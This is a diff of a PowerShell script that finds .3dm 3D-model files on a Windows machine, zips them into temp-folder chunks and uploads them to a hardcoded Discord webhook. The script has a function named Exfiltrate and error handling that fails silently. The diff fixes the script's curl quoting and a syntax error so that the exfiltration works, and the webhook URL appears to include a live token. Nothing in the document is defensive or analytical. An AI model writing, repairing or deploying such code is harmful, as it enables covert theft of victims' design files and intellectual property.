@@ -1,4 +1,4 @@
-# Discord webhook (properly formatted)
+# Discord webhook (direct)
 $hookurl = "https://discord.com/api/webhooks/1340911792490287104/2HeVPsiXhBDRrGWh0eMr9w95fJXriWcCwmY4C87i0cItyUIwjGZ5EP9vg-Nukk3WvkHF"
 
 # Target locations for .3dm files
@@ -11,15 +11,13 @@ $foldersToSearch = @(
 function Upload-ToDiscord {
     param($FilePath)
     try {
-        # Proper curl formatting with escaped quotes
-        $curlCommand = "curl.exe -F `"file1=@$FilePath`" `"$hookurl`""
-        Invoke-Expression $curlCommand
+        # Fixed curl syntax with proper escaping
+        cmd /c "curl -F `"file1=@`"$FilePath`"`" `"$hookurl`""
     }
     catch {
-        # Fallback to native PowerShell if curl fails
+        # Fallback to PowerShell method
         try {
             $boundary = [System.Guid]::NewGuid().ToString()
-            $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
             $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
             
             $body = (
@@ -30,7 +28,7 @@ function Upload-ToDiscord {
                 "--$boundary--"
             ) -join "`r`n"
             
-            Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -Headers $headers
+            Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "multipart/form-data; boundary=$boundary"
         }
         catch { <# Silent failure #> }
     }
@@ -40,7 +38,7 @@ function Exfiltrate {
     $maxZipSize = 25MB
     $currentSize = 0
     $index = 1
-    $zipPath = "$env:temp\Data$([System.Guid]::NewGuid().ToString('n')).zip"
+    $zipPath = "$env:temp\Data$index.zip"
 
     Add-Type -AssemblyName System.IO.Compression.FileSystem
     $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
@@ -52,10 +50,10 @@ function Exfiltrate {
                 $zip.Dispose()
                 Upload-ToDiscord -FilePath $zipPath
                 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-                Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 1500)
+                Start-Sleep -Milliseconds 800
                 
                 $index++
-                $zipPath = "$env:temp\Data$([System.Guid]::NewGuid().ToString('n')).zip"
+                $zipPath = "$env:temp\Data$index.zip"
                 $zip = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')
                 $currentSize = 0
             }
@@ -66,11 +64,15 @@ function Exfiltrate {
         }
     }
 
-    if ((Test-Path $zipPath) -and ((Get-Item $zipPath).Length -gt 0) {
+    if ((Test-Path $zipPath) -and ((Get-Item $zipPath).Length -gt 0)) {
         $zip.Dispose()
         Upload-ToDiscord -FilePath $zipPath
     }
     Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 }
 
+# Keep window open for debugging (remove when working)
+[Console]::WindowWidth = 80
+[Console]::WindowHeight = 30
 Exfiltrate
+Start-Sleep -Seconds 5
